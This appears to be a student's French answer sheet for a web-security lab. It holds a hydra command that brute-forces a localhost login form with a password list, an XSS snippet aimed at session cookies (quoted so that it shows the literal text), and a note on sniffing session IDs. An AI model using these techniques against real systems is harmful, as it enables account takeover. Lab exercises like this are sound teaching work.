Coutard
Antoine

Ex1

  q1. voir fichier marc.txt
  q2. hydra -l marc.martin@gmail.com -P marc.txt 127.0.0.1 http-post-form "/auth.php:username=marc.martin@gmail.com&password=^PASS^:Invalid Password!"

Ex2

  1ere méthode:
    On peut simplement utiliser une faille XSS gràce au formulaire pour récuperer les identifiants
    de session.
      <script>alert(‘document.cookie’)</script>

  2eme méthode:
    On peut aussi récupérer les trames en sniffant le réseau. L'identifiant de session est visible
    dans la requête POST
    
